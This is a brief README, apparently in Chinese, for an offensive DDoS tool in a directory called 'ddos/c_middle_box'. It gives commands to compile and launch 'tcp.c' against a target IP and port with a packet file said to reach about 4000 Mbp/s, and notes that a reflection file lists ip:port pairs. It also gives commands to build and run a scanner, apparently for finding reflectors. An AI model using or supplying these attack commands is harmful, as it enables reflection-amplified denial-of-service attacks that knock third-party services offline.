### 目录
    cd ddos/c_middle_box

### Attack
    gcc tcp.c -o tcp -pthread && ./tcp ip port packet.txt 2 20

- packet.txt 初始目录 约4000mbp/s

- 反射文件 为 ip:port


### 扫描
        gcc tcpscan.c -o tcpscan && ./tcpscan src_ip src_port packet.txt
